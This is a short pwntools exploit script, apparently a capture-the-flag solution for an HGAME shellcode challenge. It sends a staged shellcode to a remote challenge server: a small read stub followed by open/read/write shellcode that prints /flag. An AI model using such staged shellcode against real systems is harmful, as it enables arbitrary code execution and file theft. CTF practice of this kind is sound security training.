from pwn import *

context(log_level='DEBUG', arch='amd64', os='linux')
context.terminal = "wt.exe nt bash -c".split()

sh = process(["./vuln"], stdin=PTY)
sh = remote("week-1.hgame.lwsec.cn", 31589)
elf = ELF("./vuln")
libc = ELF("./libc-2.31.so")


sc = """xor eax,eax
xor edi,edi
inc edi
lea rsi,[rip+2]
syscall
"""
sc = asm(sc)
sh.sendafter(b'Please input your shellcode:', sc)

sc = shellcraft.open(b'/flag\x00', 0, 0)
sc += shellcraft.read(3, 0xcafe0100, 0x100)
sc += shellcraft.write(1, 0xcafe0100, 0x100)
sc = asm(sc)
sh.send(sc)
sh.interactive()